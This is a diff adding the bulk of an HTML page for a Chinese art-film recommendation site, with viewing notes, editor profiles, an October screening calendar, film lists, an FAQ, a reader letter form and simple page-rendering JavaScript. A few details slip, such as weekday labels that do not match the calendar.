+        <p>建议看修复版，色彩层次差别非常明显。如果有条件，请戴耳机听梅林茂那段主题音乐，它会跟着你一整天。</p>
+      </div>
+      <div class="note-ft">
+        <div class="who"><span class="ava">陆</span><span>作者：陆远舟 · 编辑部</span></div>
+        <span>已读 1,286 · 收藏 347 · <a href="#" style="color:var(--pink);font-weight:800">评论 42 条</a></span>
+      </div>
+    </article>
+    <div class="note-side">
+      <div class="note-mini"><div class="dt">2026-10-05 · 周二</div><h5>《小偷家族》：没有血缘的家，比有血缘的更像家</h5><p>是枝裕和这一次没有给答案，他把答案藏在了那个没人接的电话里。</p></div>
+      <div class="note-mini"><div class="dt">2026-10-04 · 周一</div><h5>《驾驶我的车》：三个小时的沉默，比对话更有力量</h5><p>村上春菜原著改编，剧本做了大幅调整，值得把书一起对照着读。</p></div>
+      <div class="note-mini"><div class="dt">2026-10-03 · 周日</div><h5>《燃烧》：那口枯井到底存在吗？</h5><p>李沧东把悬疑拍成了阶级寓言，看完之后脑子里一直回响那句"你有没有见过碗？"</p></div>
+      <div class="note-mini"><div class="dt">2026-10-02 · 周六</div><h5>《路边野餐》：四十二分钟的长镜头，值得一次耐心</h5><p>毕赣的凯里潮湿得能拧出水，那个镜头走过去，时间就真的变了。</p></div>
+    </div>
+  </div>
+</div></section>
+
+<!-- 编辑部 -->
+<section id="editors" style="padding-top:0"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">EDITORS · 编辑部</span>
+    <h3>三个人，三种看片方式<small>不追热点，只写真正看过的</small></h3>
+  </div><div class="r"><a href="#">投稿与合作 →</a></div></div>
+  <div class="editors">
+    <div class="editor"><div class="ava" style="background:linear-gradient(135deg,#c2416c,#f472b6)" data-role="主编">陆</div><h4>陆远舟</h4><p class="bio">前院线排片员，看过两万多场电影。坚信好电影不需要解释，只需要有人愿意坐下来。</p><div class="loves"><span>欧洲艺术片</span><span>长镜头</span><span>修复版</span></div></div>
+    <div class="editor"><div class="ava" style="background:linear-gradient(135deg,#d97706,#fbbf24)" data-role="副主编">沈</div><h4>沈知夏</h4><p class="bio">纪录片与短片研究者，跑过五个独立电影节。负责「镜面厅」与「长椅厅」的片单整理。</p><div class="loves"><span>纪录片</span><span>短片</span><span>独立电影节</span></div></div>
+    <div class="editor"><div class="ava" style="background:linear-gradient(135deg,#0d9488,#5eead4)" data-role="编辑">周</div><h4>周予安</h4><p class="bio">东亚电影研究者，正在写一个关于韩国女性导演的系列。负责版本考据与版权标注。</p><div class="loves"><span>东亚电影</span><span>女性导演</span><span>版本考据</span></div></div>
+  </div>
+</div></section>
+
+<!-- 放映日历 -->
+<section id="cal"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">CALENDAR · 放映日历</span>
+    <h3>十月放映计划<small>点击日期查看当日主题与对应片单</small></h3>
+  </div><div class="r"><span>策展周期 10/01 - 10/31</span><a href="#">订阅月度片单 →</a></div></div>
+  <div class="cal">
+    <div class="cal-h"><b>2026 年 10 月</b><div class="navb"><button>◀</button><button>▶</button></div></div>
+    <div class="weekdays"><span>一</span><span>二</span><span>三</span><span>四</span><span>五</span><span>六</span><span>日</span></div>
+    <div class="days" id="days"></div>
+    <div class="cal-legend">
+      <span><i style="background:#c2416c"></i>主题放映日</span>
+      <span><i style="background:#d97706"></i>修复版首映</span>
+      <span><i style="background:#0d9488"></i>纪录片专场</span>
+      <span><i style="background:#4f46e5"></i>短片集</span>
+      <span><i style="background:#9d7b88"></i>读者点映</span>
+    </div>
+  </div>
+</div></section>
+
+<!-- 主题片单 -->
+<section id="lists" style="padding-top:0"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">LISTS · 主题片单</span>
+    <h3>两张正在更新的片单<small>每片附版本信息与观看渠道提示</small></h3>
+  </div><div class="r"><a href="#">更多片单 →</a></div></div>
+  <div class="lists">
+    <div class="list"><div class="lh"><h4>十月的房间：十二部关于空间的电影</h4><span>更新中 · 8/12</span></div>
+      <div class="filmrow"><span class="no">01</span><span class="nm">去年在马里昂巴德</span><span class="yr">1961</span></div>
+      <div class="filmrow"><span class="no">02</span><span class="nm">对她说</span><span class="yr">2002</span></div>
+      <div class="filmrow"><span class="no">03</span><span class="nm">东京物语</span><span class="yr">1953</span></div>
+      <div class="filmrow"><span class="no">04</span><span class="nm">为所应为</span><span class="yr">1989</span></div>
+      <div class="filmrow"><span class="no">05</span><span class="nm">沙丘魔堡</span><span class="yr">1984</span></div>
+      <div class="filmrow"><span class="no">06</span><span class="nm">我的野蛮女友</span><span class="yr">2001</span></div>
+      <div class="filmrow"><span class="no">07</span><span class="nm">雾中风景</span><span class="yr">1988</span></div>
+      <div class="filmrow"><span class="no">08</span><span class="nm">暖暖内含光</span><span class="yr">2004</span></div>
+    </div>
+    <div class="list"><div class="lh"><h4>修复名录：今年值得重看的二十部</h4><span>长期更新</span></div>
+      <div class="filmrow"><span class="no">01</span><span class="nm">七武士</span><span class="yr">1954 · 4K 修复</span></div>
+      <div class="filmrow"><span class="no">02</span><span class="nm">天堂电影院</span><span class="yr">1988 · 导演剪辑版</span></div>
+      <div class="filmrow"><span class="no">03</span><span class="nm">霸王别姬</span><span class="yr">1993 · 4K 修复</span></div>
+      <div class="filmrow"><span class="no">04</span><span class="nm">花样年华</span><span class="yr">2000 · 4K 修复</span></div>
+      <div class="filmrow"><span class="no">05</span><span class="nm">活着</span><span class="yr">1994 · 修复版</span></div>
+      <div class="filmrow"><span class="no">06</span><span class="nm">牯岭街少年杀人事件</span><span class="yr">1991 · 修复版</span></div>
+      <div class="filmrow"><span class="no">07</span><span class="nm">地下</span><span class="yr">1995 · 4K 修复</span></div>
+      <div class="filmrow"><span class="no">08</span><span class="nm">一一</span><span class="yr">2000 · 4K 修复</span></div>
+    </div>
+  </div>
+</div></section>
+
+<!-- 选片方法 -->
+<section id="why"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">METHOD · 选片方法</span>
+    <h3>我们怎么挑一部片<small>彩霞电影网的六条选片标准</small></h3>
+  </div><div class="r"><a href="#">选片日志 →</a></div></div>
+  <div class="gallery">
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#9d174d,#e11d48)"><span class="yr">标准 01</span><b>先看完整片<br>再决定推不推荐</b></div><div class="bd"><h4>拒绝只看过预告片就写推荐</h4><p>编辑部规定每篇笔记对应的影片必须完整观看至少一遍，长片需要二刷后才允许进入「长椅厅」。</p><div class="tags"><span>完整观看</span><span>二刷制度</span></div></div></div>
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#b45309,#f59e0b)"><span class="yr">标准 02</span><b>版本比片名<br>更重要</b></div><div class="bd"><h4>标注修复版本与片源信息</h4><p>同一部片子可能有院线版、导演剪辑版、4K 修复版，观感差异巨大。我们逐部标注可用版本与画幅比例。</p><div class="tags"><span>版本考据</span><span>画幅标注</span></div></div></div>
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#0f766e,#14b8a6)"><span class="yr">标准 03</span><b>不追逐票房<br>只追逐被忽略</b></div><div class="bd"><h4>院线热片不占主位</h4><p>热片信息到处都有，我们把版面留给那些上映时被排片挤压、但值得被看见的独立作品与老片。</p><div class="tags"><span>独立电影</span><span>冷门佳作</span></div></div></div>
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#4338ca,#818cf8)"><span class="yr">标准 04</span><b>观感必须<br>是第一人称</b></div><div class="bd"><h4>不接受模板化短评</h4><p>「节奏紧凑、演技在线」这类话在这里没有意义。我们要求每篇笔记都带作者自己的处境与疑问。</p><div class="tags"><span>手写笔记</span><span>第一人称</span></div></div></div>
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#a16207,#facc15)"><span class="yr">标准 05</span><b>标注观看<br>渠道与版权</b></div><div class="bd"><h4>所有推荐均指向合法渠道</h4><p>每篇笔记末尾标注可观看的合法渠道与版权归属，坚决不收录、不跳转盗版资源与违规内容。</p><div class="tags"><span>合法渠道</span><span>版权标注</span></div></div></div>
+    <div class="card"><div class="cv" style="background:linear-gradient(135deg,#831843,#fb7185)"><span class="yr">标准 06</span><b>允许有人<br>不喜欢</b></div><div class="bd"><h4>不要求所有人都认同</h4><p>推荐是我们的判断，不是事实。读者可以在评论区给出相反意见，我们会把它保留下来，不删不改。</p><div class="tags"><span>允许反对</span><span>评论保留</span></div></div></div>
+  </div>
+</div></section>
+
+<!-- 常见疑问 -->
+<section id="faq" style="padding-top:0"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">FAQ · 常见疑问</span>
+    <h3>被问得最多的六件事<small>点击展开查看完整回答</small></h3>
+  </div><div class="r"><a href="#letter">没找到答案？写信给我们 →</a></div></div>
+  <div class="faqs">
+    <details class="faq" open data-no="01"><summary>彩霞电影网可以看片吗？<span class="q">点击展开</span></summary><p>本站只做影片信息的整理、版本标注与观看渠道指引，不提供在线播放与下载服务。每篇笔记末尾会标注该片目前可观看的合法渠道，部分老片可能暂时没有正规片源，我们会如实说明。</p></details>
+    <details class="faq" data-no="02"><summary>推荐的影片在哪里能看？<span class="q">点击展开</span></summary><p>我们在每部影片的条目中标注已取得合法授权的观看渠道，包括院线、正规视频平台与线下艺术影院。渠道信息随版权变动更新，若发现链接失效请通过页脚表单告知我们。</p></details>
+    <details class="faq" data-no="03"><summary>「修复版」是怎么判断的？<span class="q">点击展开</span></summary><p>我们参考发行方的公开说明、影片资料馆的片单与画幅规格进行标注，并在笔记中注明版本来源。对于无法确认的部分会标注「版本待核」，不直接写「修复版」。</p></details>
+    <details class="faq" data-no="04"><summary>片单多久更新一次？<span class="q">点击展开</span></summary><p>主题片单每月更换一次策展方向，每日更新一篇观影笔记，每周整理一张主题片单。修复名录按季度补充，读者点映片单每月收集一次。</p></details>
+    <details class="faq" data-no="05"><summary>可以投稿观影笔记吗？<span class="q">点击展开</span></summary><p>可以。通过「观影来信」栏目提交你的笔记，编辑部会在七个工作日内阅读并回复。被选中的笔记会标注作者署名与发表日期，并保留原稿中的个人观点。</p></details>
+    <details class="faq" data-no="06"><summary>为什么有些热门新片不推荐？<span class="q">点击展开</span></summary><p>这是编辑部有意识的取舍。热门新片的信息几乎到处都有，而我们希望把版面留给那些被排片挤压的独立作品、纪录片与老片。如果你想看某部新片的笔记，可以写信点映。</p></details>
+  </div>
+</div></section>
+
+<!-- 观影来信 -->
+<section id="letter" style="padding-top:0"><div class="wrap">
+  <div class="sec-head"><div class="l">
+    <span class="badge">LETTER · 观影来信</span>
+    <h3>写一封信给我们<small>也写给那个愿意陪你看电影的人</small></h3>
+  </div><div class="r"><span>每周挑选三封公开回复</span></div></div>
+  <div class="letters">
+    <div class="letter">
+      <form onsubmit="event.preventDefault();var b=this.querySelector('button');b.textContent='信件已寄出 ✓ 七个工作日内回复';b.style.background='linear-gradient(120deg,#0d9488,#14b8a6)'">
+        <div class="row2">
+          <div class="fg"><label>怎么称呼你</label><input type="text" placeholder="昵称或真名均可"></div>
+          <div class="fg"><label>回信方式</label><select><option>邮箱</option><option>站内回复</option><option>无需回复</option></select></div>
+        </div>
+        <div class="fg"><label>来信类型</label><select><option>推荐一部被忽略的片子</option><option>纠错或补充版本信息</option><option>投稿一篇观影笔记</option><option>点映一部新片</option><option>商务与版权合作</option><option>只是想聊聊电影</option></select></div>
+        <div class="fg"><label>信件正文</label><textarea placeholder="可以写你最近看的一部片子、为什么喜欢它、希望我们补充什么信息，或者只是随便说说。"></textarea></div>
+        <button type="submit">封好信封，寄出去</button>
+        <p class="tip">信件内容仅用于本站回复与公开选登，选登前会先征得同意。涉及版权合作的信息不对外公开。</p>
+      </form>
+    </div>
+    <div class="l-box">
+      <h4>最近收到的三封信</h4>
+      <div class="l-item"><span class="who">读者 · 林知秋 <time>2026-10-05</time></span>「想推荐一部 1998 年的韩国独立电影《开心见性》，国内几乎没有资料，但导演后来的作品大家都在讨论。」—— 已进入十月主题片单候选。</div>
+      <div class="l-item"><span class="who">读者 · 沈墨 <time>2026-10-03</time></span>「《牯岭街少年杀人事件》那条片源链接失效了，你们标注的修复版目前在哪个平台还能看？」—— 已核实并更新，谢谢。</div>
+      <div class="l-item"><span class="who">读者 · 匿名 <time>2026-10-01</time></span>「你们为什么不写短评？有些片子我就想快速判断要不要看。」—— 说得对，我们正在考虑加一个「三十秒判断」栏目。</div>
+    </div>
+  </div>
+</div></section>
+
+<footer><div class="foot">
+  <div class="f1">
+    <b>❀ 彩霞电影网</b>
+    <p>一个慢节奏的观影社区与光影画廊。专注经典电影修复资源、独立电影推荐与艺术院线片单，每日一篇观影笔记，每周一张主题片单。网站网址 https://caixiadianyingwang-zh.github.io/。</p>
+    <div class="social"><a href="#" title="微博">微</a><a href="#" title="豆瓣">豆</a><a href="#" title="RSS">R</a><a href="#" title="邮件订阅">@</a></div>
+  </div>
+  <div><h5>逛画廊</h5><ul>
+    <li><a href="#gallery">光影画廊</a></li>
+    <li><a href="#rooms">四个放映厅</a></li>
+    <li><a href="#cal">放映日历</a></li>
+    <li><a href="#lists">主题片单</a></li>
+    <li><a href="#why">选片方法</a></li>
+  </ul></div>
+  <div><h5>读笔记</h5><ul>
+    <li><a href="#notes">今日笔记</a></li>
+    <li><a href="#notes">往期笔记</a></li>
+    <li><a href="#editors">编辑部</a></li>
+    <li><a href="#faq">常见疑问</a></li>
+    <li><a href="#">版本考据</a></li>
+  </ul></div>
+  <div><h5>关于本站</h5><ul>
+    <li><a href="#letter">写一封信</a></li>
+    <li><a href="#">投稿须知</a></li>
+    <li><a href="#">隐私与个人信息保护</a></li>
+    <li><a href="#">版权与侵权投诉</a></li>
+    <li><a href="#">月度片单订阅</a></li>
+  </ul></div>
+</div><div class="foot-b">
+  <span>© 2026 <b>彩霞电影网</b> · 网站网址 https://caixiadianyingwang-zh.github.io/ · 本站仅提供影片信息整理、版本标注与合法观看渠道指引，不提供在线播放与下载服务</span>
+  <span class="links"><a href="#">回到顶部 ↑</a><a href="#">赣ICP备 0000000 号</a><a href="#">版权声明</a></span>
+</div></footer>
+
+<button class="top" id="topBtn" aria-label="回到顶部">↑</button>
+
+<script>
+/* 实时时钟 */
+var clk=document.getElementById('clock');
+function tick(){
+  var n=new Date(),p=function(x){return (x<10?'0':'')+x};
+  clk.textContent=p(n.getHours())+':'+p(n.getMinutes())+':'+p(n.getSeconds());
+}
+tick();setInterval(tick,1000);
+
+/* 今日精选小卡 */
+var minis=[
+  {bg:'linear-gradient(135deg,#9d174d,#be185d)',n:"雾中风景",y:1988,t:"长镜头 · 旅程",d:"安哲的雾永远不会散，两个孩子沿铁轨去找一个可能不存在的父亲。",dot:"今日主推"},
+  {bg:'linear-gradient(135deg,#7c2d12,#c2410c)',n:"地下",y:1995,t:"黑色荒诞 · 修复",d:"库斯图里卡最疯狂的一次，前南斯拉夫的寓言被拍成了狂欢节。",dot:"4K 修复"},
+  {bg:'linear-gradient(135deg,#4a044e,#a21caf)',n:"我的母亲",y:2015,t:"家庭 · 纪录感",d:"叙事太私人了，私人到让人忘记这是一部被剪辑过的电影。",dot:"独立电影"},
+  {bg:'linear-gradient(135deg,#0c4a6e,#0284c7)',n:"海上花",y:1998,t:"长镜头 · 晚清",d:"侯孝贤把整部片子关进一个房间里，外面是 1895 年的上海。",dot:"经典长镜头"},
+  {bg:'linear-gradient(135deg,#365314,#65a30d)',n:"千钧一发",y:1997,t:"科幻 · 冷门",d:"被同年《第五元素》抢走所有注意力的那部，其实更耐看。",dot:"被忽略"},
+  {bg:'linear-gradient(135deg,#831843,#e11d48)',n:"假面",y:1966,t:"心理 · 黑白",d:"伯格曼最让人不安的九十三分钟，看完会怀疑自己认不认识身边的人。",dot:"黑白经典"}
+];
+document.getElementById('miniBox').innerHTML=minis.map(function(m){
+  return '<article class="mini"><div class="thumb" style="background:'+m.bg+'">'+m.n[0]+'<small>'+m.y+'</small></div>'+
+    '<div><h5>'+m.n+' <span class="dot" style="background:var(--'+'pink)"></span></h5>'+
+    '<p>'+m.d+'</p><span style="font-size:11px;color:var(--mute)">'+m.t+' · '+m.dot+'</span></div></article>';
+}).join('');
+
+/* 光影画廊 */
+var films=[
+  {bg:'linear-gradient(135deg,#7f1d1d,#f87171)',yr:1972,bk:"4K 修复",n:"教父",g:"犯罪 / 史诗",d:"科波拉把一部黑帮片拍成了美国移民家庭的编年史，三代人的交接在那场洗礼戏里完成。",t:["马龙·白兰度","阿尔·帕西诺","奥斯卡最佳影片"]},
+  {bg:'linear-gradient(135deg,#78350f,#fbbf24)',yr:1994,bk:"导演剪辑",n:"低俗小说",g:"犯罪 / 非线性",d:"五个故事拆开来重新拼，昆汀证明了观众愿意接受被搅乱的时间。",t:["非线性叙事","1994 戛纳金棕榈","对话驱动"]},
+  {bg:'linear-gradient(135deg,#134e4a,#2dd4bf)',yr:2000,bk:"4K 修复",n:"一一",g:"家庭 / 散文",d:"杨德昌用三个小时讲一个台北家庭，每个角色都在问同一个问题：这样就够了吗。",t:["杨德昌","台北家庭","三段式人生"]},
+  {bg:'linear-gradient(135deg,#4c1d95,#a78bfa)',yr:2018,bk:"首映",n:"燃烧",g:"悬疑 / 阶级",d:"李沧东把一个悬疑故事拍成了阶级寓言，最后那场舞戏至今没人能解释清楚。",t:["李沧东","村上春树改编","戛纳入围"]},
+  {bg:'linear-gradient(135deg,#9d174d,#fb7185)',yr:2000,bk:"4K 修复",n:"花样年华",g:"爱情 / 怀旧",d:"王家卫的克制，张曼玉的二十多套旗袍，还有那首怎么都忘不掉的梅林茂。",t:["王家卫","张曼玉","旗袍美学"]},
+  {bg:'linear-gradient(135deg,#854d0e,#facc15)',yr:1993,bk:"修复版",n:"蓝白红三部曲",g:"哲学 / 三色",d:"基耶斯洛夫斯基用一个概念串起三部片子：自由、平等、博爱，每一部都是一场审判。",t:["克日什托夫·基耶斯洛夫斯基","三部曲","哲学命题"]},
+  {bg:'linear-gradient(135deg,#0f766e,#5eead4)',yr:2011,bk:"长片",n:"生命之树",g:"哲学 / 家庭",d:"马利克把宇宙起源和家庭记忆放进同一部片子，很多人都看不下去，也有人看了二十遍。",t:["泰伦斯·马利克","宇宙尺度","IMAX"]},
+  {bg:'linear-gradient(135deg,#a16207,#fde047)',yr:1998,bk:"4K 修复",n:"海上花",g:"历史 / 长镜头",d:"侯孝贤把镜头固定在房间里，外面的世界只靠声音进来，结果反而更真实。",t:["侯孝贤","晚清上海","长镜头美学"]},
+  {bg:'linear-gradient(135deg,#831843,#fda4af)',yr:2015,bk:"修复版",n:"卡罗尔",g:"爱情 / 年代",d:"托德·海因斯复刻了上世纪五十年代的色彩与服装，也复刻了那个年代的不敢说出口。",t:["凯特·布兰切特","五十年代美学","摄影获奖"]}
+];
+document.getElementById('galBox').innerHTML=films.map(function(f){
+  return '<article class="card"><div class="cv" style="background:'+f.bg+'"><span class="yr">'+f.yr+'</span><span class="bk">'+f.bk+'</span><b>'+f.n+'</b><span class="rt">❀ 展映中</span></div>'+
+    '<div class="bd"><div class="rw"><b>'+f.g+'</b><span>'+f.bk+'</span></div>'+
+    '<h4>'+f.n+'</h4><p>'+f.d+'</p>'+
+    '<div class="tags">'+f.t.map(function(x){return '<span>'+x+'</span>'}).join('')+'</div></div></article>';
+}).join('');
+
+/* 放映日历 */
+var daysEl=document.getElementById('days');
+var events={3:'c',6:'a',9:'b',12:'d',14:'e',17:'a',20:'c',23:'b',26:'d',28:'e',31:'a'};
+var labels={3:'主题放映：雾中风景',6:'4K 修复首映',9:'纪录片专场',12:'短片集',14:'读者点映',17:'主题放映：一一',20:'主题放映：燃烧',23:'修复版：花样年华',26:'短片集',28:'读者点映',31:'主题放映：海上花'};
+var html='',start=3;
+for(var i=0;i<start;i++)html+='<div class="day"></div>';
+for(var d=1;d<=31;d++){
+  var cls=d===6?'today':'',ev=events[d]?' has':'';
+  html+='<div class="day'+cls+ev+'" data-d="'+d+'" title="'+(labels[d]||'')+'"><span class="n">'+d+'</span>'+
+    (events[d]?'<span class="ev" style="background:'+({a:'#c2416c',b:'#d97706',c:'#0d9488',d:'#4f46e5',e:'#9d7b88'})[events[d]]+'"></span>':'')+'</div>';
+}
+daysEl.innerHTML=html;
+daysEl.addEventListener('click',function(e){
+  var el=e.target.closest('.day');
+  if(!el||!el.dataset.d)return;
+  [].forEach.call(daysEl.children,function(x){x.style.background=''});
+  el.style.background='var(--paper)';
+  var lb=labels[el.dataset.d];
+  if(lb)alert('10 月 '+el.dataset.d+' 日\n'+lb+'\n\n对应片单可在「主题片单」栏目查看。');
+});
+</script>
+</body>
+</html>
